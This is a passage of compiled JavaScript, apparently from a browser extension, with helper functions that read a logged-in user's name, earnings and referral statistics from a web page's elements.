                    workWebsite: window.location.origin
                }
            });
        });
    }
}
/*monitor*/
export function getLoggedInUsername() {
    document.querySelectorAll('td').forEach(function (element) {
        var _a, _b, _c, _d;
        if (((_a = element.textContent) === null || _a === void 0 ? void 0 : _a.indexOf('Welcome')) !== -1) {
            coll.user.username = (_d = (_c = (_b = element.parentElement) === null || _b === void 0 ? void 0 : _b.nextElementSibling) === null || _c === void 0 ? void 0 : _c.textContent) === null || _d === void 0 ? void 0 : _d.replace(/\s/g, '');
            return coll.user.username;
        }
    });
}
export function getLoggedInUsersEarned() {
    var _a;
    return (_a = captureElementById('moneycount').textContent) === null || _a === void 0 ? void 0 : _a.replace(/\s\$/g, '').replace(/\./, '');
}
export function getLoggedInUsersReferralsAttracted() {
    var _a;
    return (_a = captureElementById('refcount').textContent) === null || _a === void 0 ? void 0 : _a.replace(/\s/g, '');
}
export function getLoggedInUsersEarnedByReferrals() {
    var _a;
    return (_a = captureElementById('refmoney').textContent) === null || _a === void 0 ? void 0 : _a.replace(/\s\$/g, '').replace(/\./, '');
}
//# sourceMappingURL=lib-assets-app.js.map